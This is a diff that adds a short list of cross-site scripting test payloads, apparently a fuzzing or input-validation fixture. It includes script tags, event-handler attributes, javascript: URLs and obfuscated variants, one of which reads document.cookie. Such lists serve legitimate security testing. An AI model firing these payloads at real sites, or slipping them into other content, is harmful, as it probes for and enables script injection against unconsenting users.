@@ -1,0 +1,11 @@
+<script>alert('xss')</script>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+v72df<a b=c>z0ein
